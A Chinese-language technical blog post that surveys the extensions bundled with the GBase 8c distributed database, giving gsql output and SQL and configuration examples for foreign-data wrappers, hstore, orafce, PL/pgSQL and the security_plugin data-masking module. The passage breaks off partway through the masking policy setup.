<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gsql</span><br><span class="line">gsql ((multiple_nodes GBase8cV5 3.0.0B76 build 47948f99) compiled at 2023-02-27 16:04:20 commit 0 last mr 1232 )</span><br><span class="line">Non-SSL connection (SSL connection is recommended when requiring high-security)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gbase=# \dx</span><br><span class="line">                                                      List of installed extensions</span><br><span class="line">      Name       | Version |   Schema   |                                          Description                                          </span><br><span class="line">-----------------+---------+------------+-----------------------------------------------------------------------------------------------</span><br><span class="line">dist_fdw        | 1.0     | pg_catalog | foreign-data wrapper for distfs access</span><br><span class="line">file_fdw        | 1.0     | pg_catalog | foreign-data wrapper for flat file access</span><br><span class="line">gsredistribute  | 1.0     | pg_catalog | function for table redistribution</span><br><span class="line">hdfs_fdw        | 1.0     | pg_catalog | foreign-data wrapper for flat file access</span><br><span class="line">hstore          | 1.1     | pg_catalog | data type for storing sets of (key, value) pairs</span><br><span class="line">log_fdw         | 1.0     | pg_catalog | Foreign Data Wrapper for accessing logging data</span><br><span class="line">mot_fdw         | 1.0     | pg_catalog | foreign-data wrapper for MOT access</span><br><span class="line">orafce          | 3.17    | public     | Functions and operators that emulate a subset of functions and packages from the Oracle RDBMS</span><br><span class="line">plpgsql         | 1.0     | pg_catalog | PL/pgSQL procedural language</span><br><span class="line">security_plugin | 1.0     | pg_catalog | provides security functionality</span><br><span class="line">(10 rows)</span><br><span class="line"></span><br><span class="line">gbase=# select * from pg_available_extensions where installed_version is null;</span><br><span class="line">        name        | default_version | installed_version |                              comment                              </span><br><span class="line">--------------------+-----------------+-------------------+-------------------------------------------------------------------</span><br><span class="line">postgres_fdw       | 1.0             |                   | foreign-data wrapper for remote PostgreSQL servers</span><br><span class="line">pgcrypto           | 1.0             |                   | cryptographic functions</span><br><span class="line">postgis            | 3.2.1           |                   | PostGIS geometry and geography spatial types and functions</span><br><span class="line">postgis_raster     | 3.2.1           |                   | PostGIS raster types and functions</span><br><span class="line">postgis_sfcgal     | 3.2.1           |                   | PostGIS SFCGAL functions</span><br><span class="line">yukon_geogridcoder | 1.0.1           |                   | yukon geogridcoder extension</span><br><span class="line">yukon_geomodel     | 1.0.1           |                   | yukon geomodel extension</span><br><span class="line">fuzzystrmatch      | 1.0             |                   | determine similarities and distance between strings</span><br><span class="line">dblink             | 1.0             |                   | connect to other PostgreSQL databases from within a database</span><br><span class="line">pg_trgm            | 1.0             |                   | text similarity measurement and index searching based on trigrams</span><br><span class="line">mapgis3d_pg        | 1.1             |                   | support mapgis3d type.</span><br><span class="line">mysql_fdw          | 1.1             |                   | Foreign data wrapper for querying a MySQL server</span><br><span class="line">oracle_fdw         | 1.1             |                   | foreign data wrapper for Oracle access</span><br><span class="line">zhparser           | 2.2             |                   | a parser for full-text search of Chinese</span><br><span class="line">uuid-ossp          | 1.1             |                   | generate universally unique identifiers (UUIDs)</span><br><span class="line">(15 rows)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-01.png"
                      alt="" loading="lazy"
                ></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-02.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="1-dist-fdw">1. dist_fdw</h2>
<p>从 dist_fdw 的命名不难看出是一个 fdw （Foreign Data Wrapper），外部数据包装器。</p>
<p>安装dist fdw之后，会提供两个内置方法。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase=# \df dist_fdw_*</span><br><span class="line">                                                   List of functions</span><br><span class="line">   Schema   |        Name        | Result data type | Argument data types |  Type  | fencedmode | propackage | prokind</span><br><span class="line">------------+--------------------+------------------+---------------------+--------+------------+------------+---------</span><br><span class="line">pg_catalog | dist_fdw_handler   | fdw_handler      |                     | normal | f          | f          | f</span><br><span class="line">pg_catalog | dist_fdw_validator | void             | text[], oid         | normal | f          | f          | f</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure></div>
<p>通过元命令 \des 可以查看当前已经创建的 fwd server。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase=# \des+</span><br><span class="line">                                                List of foreign servers</span><br><span class="line">          Name          | Owner | Foreign-data wrapper | Access privileges | Type | Version | FDW Options | Description</span><br><span class="line">------------------------+-------+----------------------+-------------------+------+---------+-------------+-------------</span><br><span class="line">gsmpp_errorinfo_server | gbase | file_fdw             |                   |      |         |             |</span><br><span class="line">gsmpp_server           | gbase | dist_fdw             |                   |      |         |             |</span><br><span class="line">log_srv                | gbase | log_fdw              |                   |      |         |             |</span><br><span class="line">mot_server             | gbase | mot_fdw              |                   |      |         |             |</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gbase=# select oid, * from pg_catalog.pg_foreign_server;</span><br><span class="line">  oid  |        srvname         | srvowner | srvfdw | srvtype | srvversion | srvacl | srvoptions</span><br><span class="line">-------+------------------------+----------+--------+---------+------------+--------+------------</span><br><span class="line">14851 | gsmpp_server           |       10 |  14850 |         |            |        |</span><br><span class="line">14856 | gsmpp_errorinfo_server |       10 |  14855 |         |            |        |</span><br><span class="line">14888 | log_srv                |       10 |  14887 |         |            |        |</span><br><span class="line">14930 | mot_server             |       10 |  14929 |         |            |        |</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">gbase=# select oid, * from pg_catalog.pg_foreign_data_wrapper;</span><br><span class="line">  oid  | fdwname  | fdwowner | fdwhandler | fdwvalidator | fdwacl | fdwoptions</span><br><span class="line">-------+----------+----------+------------+--------------+--------+------------</span><br><span class="line">14850 | dist_fdw |       10 |      14848 |        14849 |        |</span><br><span class="line">14855 | file_fdw |       10 |      14853 |        14854 |        |</span><br><span class="line">14860 | hdfs_fdw |       10 |      14858 |        14859 |        |</span><br><span class="line">14861 | dfs_fdw  |       10 |      14858 |        14859 |        |</span><br><span class="line">14887 | log_fdw  |       10 |      14885 |        14886 |        |</span><br><span class="line">14929 | mot_fdw  |       10 |      14927 |        14928 |        |</span><br><span class="line">(6 rows)</span><br></pre></td></tr></table></figure></div>
<p>dist fdw 运行与 gauss 内核中，在DB初始化后会自动安装，并创建了一个名为 <code>gsmpp_server</code> 的服务，可用于创建位于分布式存储的外部表。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table torg();</span><br><span class="line">CREATE FOREIGN TABLE tmpp( like torg) SERVER gsmpp_server OPTIONS (LOCATION &#x27;gsfs://127.0.0.1:8781/xxx.txt&#x27;, FORMAT &#x27;text&#x27;);</span><br></pre></td></tr></table></figure></div>
<p>这里的外部存储也可以是OBS（Object Storage Service）。<br>
对象存储服务，是一个基于对象的存储服务，为客户提供海量、安全、高可靠、低成本的数据存储能力。</p>
<hr>
<h2 id="2-file-fdw">2. file_fdw</h2>
<p>在 GBase 8c 中，只是预装了 file_fdw，并且预设了 gsmpp_errorinfo_server ，但并没有调用者。</p>
<p>file_fdw 是从 PostgreSQL 移植过来的插件，是 PostgreSQL 在 9.1 版本发布的一款 FDW，<br>
它能被用来访问服务器的文件系统中的数据文件，或者服务器上执行程序并读取它们的输出。 数据文件或程序输出必须是能够被COPY FROM读取的格式。</p>
<p>比如可以读取服务器上的日志文件。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE EXTENSION file_fdw;</span><br><span class="line"></span><br><span class="line">CREATE SERVER pglog FOREIGN DATA WRAPPER file_fdw;</span><br><span class="line"></span><br><span class="line">CREATE FOREIGN TABLE pglog (</span><br><span class="line">  log_time timestamp(3) with time zone,</span><br><span class="line">  user_name text,</span><br><span class="line">  database_name text,</span><br><span class="line">  process_id integer,</span><br><span class="line">  connection_from text,</span><br><span class="line">  session_id text,</span><br><span class="line">  session_line_num bigint,</span><br><span class="line">  command_tag text,</span><br><span class="line">  session_start_time timestamp with time zone,</span><br><span class="line">  virtual_transaction_id text,</span><br><span class="line">  transaction_id bigint,</span><br><span class="line">  error_severity text,</span><br><span class="line">  sql_state_code text,</span><br><span class="line">  message text,</span><br><span class="line">  detail text,</span><br><span class="line">  hint text,</span><br><span class="line">  internal_query text,</span><br><span class="line">  internal_query_pos integer,</span><br><span class="line">  context text,</span><br><span class="line">  query text,</span><br><span class="line">  query_pos integer,</span><br><span class="line">  location text,</span><br><span class="line">  application_name text,</span><br><span class="line">  backend_type text,</span><br><span class="line">  leader_pid integer,</span><br><span class="line">  query_id bigint</span><br><span class="line">) SERVER pglog</span><br><span class="line">OPTIONS ( filename &#x27;log/postgresql-2023-03-29.csv&#x27;, format &#x27;csv&#x27; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from pglog;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-03.png"
                      alt="" loading="lazy"
                ></p>
<hr>
<h2 id="3-gsredistribute">3. gsredistribute</h2>
<p>GBase 8c 是分布式数据库，支持 CN, DN 节点。 当启用多节点模式时，需要加载扩展： gsredistribute</p>
<p>与该扩展相关的命令有： gs_redis ，该命令用于扩展节点时数据重分布。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ ~/gbase_db/app/bin/gs_redis --help</span><br><span class="line">gs_redis execute data redistribute on cluster expansion.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  gs_redis [OPTION]... Options:</span><br><span class="line">  -v, --build-redistb          build pgxc_redistb entries for tables that needing redistirbution.</span><br><span class="line">  -r, --build-redistb-start    build pgxc_redistb table if not exist and start re-distribution.</span><br><span class="line">  -t, --timeout=SECS           set wait timeout for lock table.(default 60s)</span><br><span class="line">  -j, --jobs=NUM               use this many parallel jobs to redistribute. NUM tables of one database can be redistributed</span><br><span class="line">                               at the same time. parallel is not used by default.</span><br><span class="line">  -c, --vacuum                 does vacuum full after data redistribution (default no); if -f specified, -c is ignored.</span><br><span class="line">  -f, --fast-redis             fast data redistribution; need extra storage during data redistribution (default no).</span><br><span class="line">  -m, --mode=MODE              run data redistribution in mode: read-only or insert (default read-only).</span><br><span class="line">                               read-only mode is used for offline redistribution, insert mode is used for online redistribution.</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from pgxc_class;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-04.png"
                      alt="" loading="lazy"
                ></p>
<p>以下函数为重分布期间gs_redis工具所用的系统函数，用户不要主动调用：</p>
<ul>
<li>pg_get_redis_rel_end_ctid(text, name, int, int)</li>
<li>pg_get_redis_rel_start_ctid(text, name, int, int)</li>
<li>pg_enable_redis_proc_cancelable()</li>
<li>pg_disable_redis_proc_cancelable()</li>
<li>pg_tupleid_get_blocknum(tid)</li>
<li>pg_tupleid_get_offset(tid)</li>
<li>pg_tupleid_get_ctid_to_bigint (ctid)</li>
</ul>
<p>以下函数均针对时序表，所指oid均只针对时序表：</p>
<ul>
<li>redis_ts_table(oid)</li>
</ul>
<hr>
<h2 id="4-hdfs-fdw">4. hdfs_fdw</h2>
<p>hdfs_fdw 是 EDB 开源的一款扩展插件，支持 PostgreSQL 11 ~ 15.</p>
<p>hdfs fdw 用于创建外部服务器，存储HDFS集群信息、OBS服务器信息或其他同构集群信息，可连接 apache hadoop， hive， spark。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--创建hdfs_server</span><br><span class="line">CREATE SERVER hdfs_server FOREIGN DATA WRAPPER HDFS_FDW OPTIONS</span><br><span class="line">   (address &#x27;10.10.0.100:25000,10.10.0.101:25000&#x27;,</span><br><span class="line">    hdfscfgpath &#x27;/opt/hadoop_client/HDFS/hadoop/etc/hadoop&#x27;,</span><br><span class="line">    type &#x27;HDFS&#x27;</span><br><span class="line">) ;</span><br></pre></td></tr></table></figure></div>
<p>在 GBase 8c 中，分区表进程也会用到 hdfs_fdw 。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase=# select fdwname from pg_foreign_data_wrapper where fdwname = &#x27;hdfs_fdw&#x27;;</span><br><span class="line">fdwname  </span><br><span class="line">----------</span><br><span class="line">hdfs_fdw</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# select * from pg_foreign_data_wrapper;</span><br><span class="line">fdwname  | fdwowner | fdwhandler | fdwvalidator | fdwacl | fdwoptions</span><br><span class="line">----------+----------+------------+--------------+--------+------------</span><br><span class="line">dist_fdw |       10 |      14848 |        14849 |        |</span><br><span class="line">file_fdw |       10 |      14853 |        14854 |        |</span><br><span class="line">hdfs_fdw |       10 |      14858 |        14859 |        |</span><br><span class="line">dfs_fdw  |       10 |      14858 |        14859 |        |</span><br><span class="line">log_fdw  |       10 |      14885 |        14886 |        |</span><br><span class="line">mot_fdw  |       10 |      14927 |        14928 |        |</span><br><span class="line">(6 rows)</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="5-hstore">5. hstore</h2>
<p>hstore 是 PostgreSQL 8.2 引入的扩展，该模块实现了 hstore 数据类型，<br>
用于在单个PostgreSQL值中存储键/值对集。<br>
这在各种场景中都很有用，比如具有许多很少检查的属性的行，或者半结构化数据。<br>
当前数据库中具有CREATE权限的普通用户即可创建该模块。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 为记录或行构建hstore类型</span><br><span class="line">gbase=# select &#x27;a=&gt;1,a=&gt;2&#x27;::hstore;</span><br><span class="line">  hstore  </span><br><span class="line">----------</span><br><span class="line">&quot;a&quot;=&gt;&quot;1&quot;</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">-- hstore(record)返回hstore类型</span><br><span class="line">gbase=# select hstore(row(1,2));</span><br><span class="line">        hstore        </span><br><span class="line">----------------------</span><br><span class="line">&quot;f1&quot;=&gt;&quot;1&quot;, &quot;f2&quot;=&gt;&quot;2&quot;</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">-- hstore(text[])返回hstore类型, 为键值数组或二维数组构建hstore类型</span><br><span class="line">gbase=# select hstore(array[&#x27;a&#x27;,&#x27;1&#x27;,&#x27;b&#x27;,&#x27;2&#x27;]);</span><br><span class="line">       hstore       </span><br><span class="line">--------------------</span><br><span class="line">&quot;a&quot;=&gt;&quot;1&quot;, &quot;b&quot;=&gt;&quot;2&quot;</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 将记录转为hstore类型</span><br><span class="line">gbase=# CREATE TABLE test(col1 integer,col2 text,col3 text);</span><br><span class="line">CREATE TABLE</span><br><span class="line">postgres=# INSERT INTO test VALUES(123,&#x27;foo&#x27;,&#x27;bar&#x27;);</span><br><span class="line">INSERT 0 1</span><br><span class="line">postgres=# SELECT hstore(t) FROM test AS t;</span><br><span class="line">                   hstore                    </span><br><span class="line">---------------------------------------------</span><br><span class="line">&quot;col1&quot;=&gt;&quot;123&quot;, &quot;col2&quot;=&gt;&quot;foo&quot;, &quot;col3&quot;=&gt;&quot;bar&quot;</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="6-log-fdw">6. log_fdw</h2>
<p>查阅资料发现目前有两个版本的 log fdw。<br>
一个是 aws 开源的版本，用于 aws rds，可更加便利的读取数据库日志，从DB中通过外部表的方式直接用sql查询日志文件内容。</p>
<p>另一个是 openGauss 中的 log fdw, 可以查询集群日志，如下图，可以在 8c 中查询 数据节点的日志信息。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-05.png"
                      alt="" loading="lazy"
                ></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-06.png"
                      alt="" loading="lazy"
                ></p>
<hr>
<h2 id="7-mot-fdw">7. mot_fdw</h2>
<p>mot fdw 用于创建 MOT 表。<br>
MOT, Memory Optimized Table, 内存优化表存储引擎，表示表的数据将以内存的形式存储。<br>
MOT 内存适用于高吞吐事务处理，性能瓶颈加速，消除中间层缓存，大规模流数据提取。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-07.png"
                      alt="" loading="lazy"
                ></p>
<p>启用 mot 表，需要在安装节点 执行 gs_guc 命令 修改数据库参数。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gs_guc reload -Z coordinator -N all -I all -c &quot;enable_incremental_checkpoint=off&quot;</span><br><span class="line">gs_guc reload -Z datanode -N all -I all -c &quot;enable_incremental_checkpoint=off&quot;</span><br><span class="line">gs_guc reload -Z gtm -N all -I all -c &quot;enable_incremental_checkpoint=off&quot;</span><br><span class="line"></span><br><span class="line">gs_guc reload -Z coordinator -N all -I all -c &quot;enable_gbase_mot=on&quot;</span><br><span class="line">gs_guc reload -Z datanode -N all -I all -c &quot;enable_gbase_mot=on&quot;</span><br><span class="line">gs_guc reload -Z gtm -N all -I all -c &quot;enable_gbase_mot=on&quot;</span><br></pre></td></tr></table></figure></div>
<p>在创建MOT表时，<code>server mot_server</code> 部分是可选的，因为MOT是一个集成的引擎，而不是一个独立的服务器。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create foreign table test_astore_mot(col int) server mot_server ;</span><br></pre></td></tr></table></figure></div>
<p>但是，MOT 通过 mot_fdw 与 gbase 8c 集成，需要授权用户权限。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT USAGE ON FOREIGN SERVER mot_server TO &#x27;user&#x27;;</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="8-orafce">8. orafce</h2>
<p>orafce 是 PostgreSQL 中“知名”扩展，已支持 PostgreSQL 15。</p>
<p>&quot;orafce&quot;项目在Postgres中实现了Oracle数据库中缺失的一些函数(或行为不同)。<br>
这个模块包含了一些实用的函数，Oracle PL/SQL 子程序的子集和安装包可，以帮助将Oracle应用程序移植到 PostgreSQL 或 GBase 8c。<br>
内置的Oracle日期函数已经在Oracle 10上进行了一致性测试。 从1960年到2070年的日期可以正常工作。 由于Oracle中的一个错误，无法验证1100-03-01之前的日期。</p>
<p>安装插件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE EXTENSION orafce;</span><br></pre></td></tr></table></figure></div>
<p>现在orafce已经包含了如下内容：</p>
<ol>
<li>类型 date, varchar2 and nvarchar2</li>
<li>函数 concat, nvl, nvl2, lnnvl, decode, bitand, nanvl, sinh, cosh, tanh and oracle.substr</li>
<li>dual 表</li>
<li>package: dbms_alert, dbms_pipe, utl_file, dbms_output, dbms_random, date, operations, dual</li>
</ol>
<p>使用 orafce 前：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"># SELECT <span class="literal">NULL</span> || <span class="string">&#x27;hello&#x27;</span>::varchar2 || <span class="literal">NULL</span>;</span><br><span class="line">ERROR:  type <span class="string">&quot;varchar2&quot;</span> does not exist</span><br><span class="line">LINE <span class="number">1</span>: SELECT <span class="literal">NULL</span> || <span class="string">&#x27;hello&#x27;</span>::varchar2 || <span class="literal">NULL</span>;</span><br><span class="line">                                ^</span><br></pre></td></tr></table></figure></div>
<p>使用 orafce 后：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">set</span> search_path <span class="keyword">TO</span> oracle,&quot;$user&quot;, public, pg_catalog;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="operator">||</span> <span class="string">&#x27;hello&#x27;</span>::varchar2 <span class="operator">||</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> ?<span class="keyword">column</span>? <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> [<span class="keyword">null</span>]   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">SET</span> orafce.varchar2_null_safe_concat <span class="keyword">TO</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="operator">||</span> <span class="string">&#x27;hello&#x27;</span>::varchar2 <span class="operator">||</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> ?<span class="keyword">column</span>? <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> hello    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sin/sinh 函数</span></span><br><span class="line">$ <span class="keyword">SELECT</span> <span class="built_in">SIN</span>(<span class="number">1.414</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span>        sin         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.9877326197620127</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">SELECT</span> <span class="built_in">SINH</span>(<span class="number">1.414</span>) <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span>        sinh        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1.9346016882495571</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="9-plpgsql">9. plpgsql</h2>
<p>PL/pgSQL是一种用于PostgreSQL数据库系统的可载入的过程语言。<br>
在PostgreSQL 9.0 和以后的版本中，PL/pgSQL是默认被安装的。但是它仍然是一种可载入模块，因此特别关注安全性的管理员可以选择移除它。<br>
PL/pgSQL与 PL/SQL 在许多方面都非常类似。它是一种块结构的、命令式的语言并且所有变量必须先被声明。</p>
<p>举个栗子：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> somefunc() <span class="keyword">RETURNS</span> <span class="type">integer</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    quantity <span class="type">integer</span> :<span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    RAISE NOTICE <span class="string">&#x27;Quantity here is %&#x27;</span>, quantity;  <span class="comment">-- Prints 30</span></span><br><span class="line">    <span class="keyword">RETURN</span> quantity;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ <span class="keyword">LANGUAGE</span> plpgsql;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">select</span> somefunc();</span><br><span class="line">NOTICE:  Quantity here <span class="keyword">is</span> <span class="number">30</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> somefunc <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="10-security-plugin">10. security_plugin</h2>
<p>security_plugin 是 GBase 8c 中的数据动态脱敏插件。</p>
<blockquote>
<p>当系统接收到查询命令时，security_plugin将在解析器中拦截语义分析生成的查询树（Query），首先根据用户登录信息（用户名、客户端、IP）筛选出满足用户场景的脱敏策略。由于脱敏策略是基于（仅包含表列的）资源标签配置的，因此需要判断查询树的目标节点是否属于某个资源标签，然后将识别到的资源标签与脱敏策略相匹配，根据策略内容将查询树目标节点改写，最终将查询树返还给解析器。<br>
security_plugin模块由于内置查询树脱敏方式，数据访问者不会感知内置安全策略重写查询树的过程，如同执行普通查询一样去访问数据，同时保护数据隐私。</p>
</blockquote>
<ol>
<li>打开内置安全策略[ 默认off ]</li>
</ol>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">gs_guc reload -N all -I all -c <span class="string">&quot;enable_security_policy=on&quot;</span></span><br><span class="line">gsql -d postgres -p <span class="number">5432</span> -c <span class="string">&quot;show enable_security_policy ;&quot;</span></span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>创建测试表及数据</li>
</ol>
<ul>
<li>创建测试表person</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> person(id <span class="type">int</span> <span class="keyword">primary</span> key,name <span class="type">varchar</span>(<span class="number">20</span>),creditcard <span class="type">varchar</span>(<span class="number">20</span>),address <span class="type">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> person <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;1234-4567-7890-0123&#x27;</span>,<span class="string">&#x27;huoyue Mansion, No. 98, 1st Fuhua Street&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> person <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;1111-2222-3333-4444&#x27;</span>,<span class="string">&#x27;Futian District, Shenzhen City&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-08.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>创建测试表orders</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> orders(id <span class="type">int</span> <span class="keyword">primary</span> key,pid <span class="type">int</span>,customername <span class="type">varchar</span>(<span class="number">20</span>),order_no <span class="type">int</span>,email <span class="type">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> orders <span class="keyword">values</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;李雷&#x27;</span>,<span class="number">13002345</span>,<span class="string">&#x27;654321@qq.com&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> orders <span class="keyword">values</span>(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;韩梅&#x27;</span>,<span class="number">13001234</span>,<span class="string">&#x27;testdb@huawei.com&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> orders <span class="keyword">values</span>(<span class="number">3</span>,<span class="number">2</span>,<span class="string">&#x27;Jerry&#x27;</span>,<span class="number">13009876</span>,<span class="string">&#x27;test123@google.com&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> orders;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-extensions/2023-03-30-09.png"
                      alt="" loading="lazy"
                ></p>
<ol start="3">
<li>策略配置</li>
</ol>
<ul>
<li>创建资源标签【对表的敏感字段添加资源标签(需要拥有poladmin权限)】</li>
</ul>
